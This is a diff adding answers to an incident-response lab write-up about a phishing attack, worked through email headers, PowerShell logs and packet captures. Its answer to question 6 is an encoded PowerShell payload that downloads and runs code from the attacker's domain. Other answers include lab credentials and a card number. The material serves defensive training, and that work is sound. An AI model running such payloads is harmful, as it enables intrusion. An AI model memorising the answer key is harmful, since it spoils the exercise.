@@ -83,16 +83,26 @@ Once the payload from the encrypted archive is extracted, use lnkparse to extrac
 
 Answer the questions below
 1. What is the email address used to send the phishing email?
+- *agriffin@bpakcaging.xyz*
 
 2. What is the email address of the victim?
+- *julianne.westcott@hotmail.com*
 
 3. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
+- We can copy the content of the email header and use online tool to analyze the content. Here I used https://mha.azurewebsites.net/
+- *elasticemail*
 
 4. What is the name of the file inside the encrypted attachment?
+- *Invoice_20230103.lnk*
 
 5. What is the password of the encrypted attachment?
+- *Invoice2023!*
 
 6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
+- Parse the the malicious file using the tool mentioned.
+- `Inkparse Invoice_20230103.lnk`
+- Decode the strings in cyberchef.
+- *aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==*
 
 ## Task 3: [Endpoint Security] Are you sure that’s an invoice? ##
 
@@ -137,20 +147,32 @@ Note: You must be familiar with the existing fields in a single log.
 You may continue learning this tool via its documentation.
 Answer the questions below
 1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
+- `jq -r 'keys[]' powershell.json |sort | uniq`
+- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq`
+- *cdn.bpakcaging.xyz,files.bpakcaging.xyz*
 
 2. What is the name of the enumeration tool downloaded by the attacker?
+- *Seatbelt*
 
 3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
+- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq | grep -e 'sq3.exe' -e 'cd'`
+- *C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*
 
 4. What is the software that uses the file in Q3?
+- *Microsoft Sticky Notes*
 
 5. What is the name of the exfiltrated file?
+- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq`
+- *protected_data.kdbx*
 
 6. What type of file uses the .kdbx file extension?
+- *KeePass*
 
 7. What is the encoding used during the exfiltration attempt of the sensitive file?
+- *hex*
 
 8. What is the tool used for exfiltration?
+- *nslookup*
 
 
 ## Task 4: [Network Traffic Analysis] They got us. Call the bank immediately! ##
@@ -171,11 +193,24 @@ Finally, we can complete the investigation by understanding the network traffic 
 
 Answer the questions below
 1. What software is used by the attacker to host its presumed file/payload server?
+- Filter the packet with http and keyword of the URL where the file was hosted.
+- Follow the TCP stream of the filtered results and we could see in the response section the software used to host the file.
+- *Python*
 
 2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?
+- We discovered the method used in the previous task.
+- *POST*
 
 3. What is the protocol used during the exfiltration activity?
+- We also discovered from the previous task that DNS lookup was used to exfiltrate a file.
+- *dns*
 
 4. What is the password of the exfiltrated file?
+- Filter in Wireshark packets with HTTP with a keyword containing the binary used to enumerate the SQLite database.
+- Follow the TCP stream. We see the SQL command used to retrieve the data from the table “NOTE”. Note that stream is at packet 749.
+- *%p9^3!lL^Mz47E2GaT^y*
 
 5. What is the credit card number stored inside the exfiltrated file?
+- Using Wireshark at first, I built a display filter that utilizes the info we got from the previous task: nslookup -q=A. This can be done by going to "Analyze > Display Filter Expressions".
+- Added to the filter is the destination IP of the exfiltrated file.
+- *4024007128269551*
